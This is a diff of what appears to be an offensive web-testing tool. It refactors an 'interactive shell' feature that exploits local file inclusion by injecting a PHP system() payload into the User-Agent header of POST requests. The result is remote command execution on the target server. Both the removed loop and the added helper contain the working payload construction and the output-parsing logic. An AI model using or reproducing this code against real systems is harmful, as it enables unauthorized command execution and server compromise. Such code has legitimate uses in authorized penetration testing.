@@ -1,4 +1,3 @@
-import os
 import re
 import random
 import string
@@ -77,54 +76,23 @@ class EnvironChecker(BaseChecker):
 
         return False, None
 
+    def _build_shell_url(self, cmd, param_name):
+        php_cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
+        parsed_url = urllib.parse.urlparse(self.url)
+        params = urllib.parse.parse_qs(parsed_url.query)
+        new_params = params.copy()
+        new_params[param_name] = self.return_filepath
+        new_query = urllib.parse.urlencode(new_params, doseq=True)
+        fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
+        return fuzzed_url, "POST", {"headers": {'User-Agent': php_cmd}}
+
     def run_shell(self, param_name):
         """Custom shell - injects commands via User-Agent header (POST)."""
         self.silent = True
         result, param_name = self.environ_check()
 
         if result:
-            parsed_url = urllib.parse.urlparse(self.url)
-            params = urllib.parse.parse_qs(parsed_url.query)
-            new_params = params.copy()
-            new_params[param_name] = self.return_filepath
-            new_query = urllib.parse.urlencode(new_params, doseq=True)
-            fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-            self.console.print("[bold yellow]Interactive shell is ready. Type your commands.[/bold yellow]")
-
-            from prompt_toolkit import PromptSession
-            from prompt_toolkit.formatted_text import HTML
-            from prompt_toolkit.history import InMemoryHistory
-
-            session = PromptSession(history=InMemoryHistory())
-            while True:
-                try:
-                    cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
-                    if not cmd:
-                        continue
-                    if cmd.strip().lower() in ("exit", "quit"):
-                        raise KeyboardInterrupt
-                    if cmd.strip().lower() in ("clear", "cls"):
-                        os.system("cls" if os.name == "nt" else "clear")
-                        continue
-
-                    php_cmd = f"<?php echo '['; echo 'S]'; system('{cmd}'); echo '[E]';?>"
-                    headers = {'User-Agent': php_cmd}
-
-                    response = self._safe_post(fuzzed_url, headers=headers)
-                    if response is None:
-                        continue
-
-                    pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
-                    response_content = pattern.search(response.text)
-                    if response_content and response_content.group(1):
-                        shell_output = response_content.group(1)
-                        self.console.print(f"[bold green]{shell_output}[/bold green]")
-                    else:
-                        self.console.print("[bold red]No shell output.[/bold red]")
-
-                except KeyboardInterrupt:
-                    self.console.print("[bold yellow][!] Exiting shell...[/bold yellow]")
-                    break
+            self._interactive_shell(param_name, self._build_shell_url)
 
         return None
 
